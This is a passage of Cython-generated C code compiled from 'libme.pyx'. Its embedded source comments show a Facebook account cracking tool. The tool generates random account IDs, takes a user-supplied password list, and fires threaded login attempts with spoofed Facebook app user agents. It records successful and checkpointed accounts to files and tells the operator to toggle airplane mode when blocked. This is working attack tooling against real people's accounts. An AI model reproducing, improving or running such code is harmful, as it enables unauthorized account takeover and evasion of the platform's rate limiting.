                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_11);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                  }
                }
                __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__12);
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 280, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                __pyx_t_8 = NULL;
                __pyx_t_12 = 0;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_8)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_8);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                    __pyx_t_12 = 1;
                  }
                }
                #if CYTHON_FAST_PYCALL
                if (PyFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 280, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                #if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 280, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                {
                  __pyx_t_11 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 280, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  if (__pyx_t_8) {
                    __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_8); __pyx_t_8 = NULL;
                  }
                  __Pyx_GIVEREF(__pyx_t_9);
                  PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_12, __pyx_t_9);
                  __Pyx_INCREF(__pyx_v_user);
                  __Pyx_GIVEREF(__pyx_v_user);
                  PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_12, __pyx_v_user);
                  __Pyx_GIVEREF(__pyx_t_10);
                  PyTuple_SET_ITEM(__pyx_t_11, 2+__pyx_t_12, __pyx_t_10);
                  __pyx_t_9 = 0;
                  __pyx_t_10 = 0;
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 280, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":279
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              }
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

              /* "libme.pyx":270
 * 				self.id.append(ib+str(i))
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
            }
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            goto __pyx_L20_try_end;
            __pyx_L15_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("libme.James.__fb3__", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_13, &__pyx_t_1) < 0) __PYX_ERR(0, 270, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_GOTREF(__pyx_t_1);
              __pyx_t_11 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_13, __pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 270, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_11);
              __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_t_11, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 270, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_20);
              __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_20);
              __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
              if (__pyx_t_19 < 0) __PYX_ERR(0, 270, __pyx_L17_except_error)
              __pyx_t_21 = ((!(__pyx_t_19 != 0)) != 0);
              if (__pyx_t_21) {
                __Pyx_GIVEREF(__pyx_t_2);
                __Pyx_GIVEREF(__pyx_t_13);
                __Pyx_XGIVEREF(__pyx_t_1);
                __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_13, __pyx_t_1);
                __pyx_t_2 = 0; __pyx_t_13 = 0; __pyx_t_1 = 0; 
                __PYX_ERR(0, 270, __pyx_L17_except_error)
              }
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              goto __pyx_L16_exception_handled;
            }
            __pyx_L17_except_error:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            goto __pyx_L3_error;
            __pyx_L16_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            __pyx_L20_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_15) {
              __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__13, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 270, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_18);
              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            }
            goto __pyx_L14;
          }
          __pyx_L14:;
        }
        goto __pyx_L27;
        __pyx_L11_error:;
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L3_error;
        __pyx_L27:;
      }

      /* "libme.pyx":281
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":264
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":282
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:             # <<<<<<<<<<<<<<
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__fb3__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_13, &__pyx_t_2) < 0) __PYX_ERR(0, 282, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_13);
      __pyx_v_e = __pyx_t_13;

      /* "libme.pyx":283
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 * 			exit(str(e))             # <<<<<<<<<<<<<<
 * 	def __apii__(self, uid, pwx):
 * 		ua = random.choice([
 */
      __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_e); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 283, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 283, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":264
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":259
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb3__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111111
 * 		xx = 9999999
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("libme.James.__fb3__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_idx);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_ib);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":284
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_17__apii__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_17__apii__ = {"__apii__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5libme_5James_17__apii__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5libme_5James_17__apii__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__apii__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_uid,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_uid)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__apii__", 1, 3, 3, 1); __PYX_ERR(0, 284, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__apii__", 1, 3, 3, 2); __PYX_ERR(0, 284, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__apii__") < 0)) __PYX_ERR(0, 284, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_uid = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__apii__", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 284, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("libme.James.__apii__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5libme_5James_16__apii__(__pyx_self, __pyx_v_self, __pyx_v_uid, __pyx_v_pwx);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_16__apii__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__apii__", 0);

  /* "libme.pyx":285
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):
 * 		ua = random.choice([             # <<<<<<<<<<<<<<
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 * 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_GIVEREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":297
 * 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 * 		])
 * 		sys.stdout.write(             # <<<<<<<<<<<<<<
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 297, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 297, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 297, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":298
 * 		])
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))             # <<<<<<<<<<<<<<
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 */
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyTuple_New(4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_7);
